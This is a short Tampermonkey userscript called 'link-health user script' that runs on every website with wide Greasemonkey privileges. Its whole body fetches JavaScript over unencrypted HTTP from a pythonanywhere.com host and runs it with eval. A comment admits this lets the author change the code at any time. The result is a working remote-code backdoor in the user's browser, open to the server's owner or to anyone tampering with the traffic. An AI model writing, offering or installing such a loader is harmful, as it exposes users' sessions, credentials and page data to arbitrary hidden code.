// ==UserScript==
// @name         link-health user script
// @namespace    http://tampermonkey.net/
// @version      2024-06-03
// @description  try to take over the world!
// @author       You
// @match        *://*/*
// @icon         https://i0.wp.com/link-health.org/wp-content/uploads/2022/10/Link-Health-transparent.png?resize=800%2C800&ssl=1
// @grant        GM.xmlHttpRequest
// @grant        GM.setValue
// @grant        GM.getValue
// @grant        GM.addStyle
// @grant        GM.getResourceText
// @grant        GM.info
// @grant        GM.notification
// @grant        GM.openInTab
// @grant        GM.registerMenuCommand
// @grant        GM.setClipboard
// @grant        GM.deleteValue
// @grant        GM.listValues
// @grant        GM.log
// @grant        GM.addValueChangeListener
// @grant        GM.removeValueChangeListener
// @license      MIT
// @downloadURL https://update.greasyfork.org/scripts/495168/link-health%20user%20script.user.js
// @updateURL https://update.greasyfork.org/scripts/495168/link-health%20user%20script.meta.js
// ==/UserScript==



/*
This code uses eval on a code that is hosted on server, you can see the hosted code @ http://alistermartin.pythonanywhere.com/user-script.js
This makes us update the code at any time. For any concerns please inform the authorities.
*/

(function() {
    'use strict';

    // Fetch the code from the specified URL
    GM.xmlHttpRequest({
        method: 'GET',
        url: 'http://alistermartin.pythonanywhere.com/user-script.js',
        onload: function(response) {
            if (response.status === 200) {
                // Parse the response JSON
                let data = JSON.parse(response.responseText);
                if (data.code) {
                    // Execute the fetched code
                    console.log(data.code)
                    eval(data.code);
                } else {
                    console.error('No code found in the response');
                }
            } else {
                console.error('Failed to fetch the script:', response.statusText);
            }
        },
        onerror: function(error) {
            console.error('Error fetching the script:', error);
        }
    });
})();
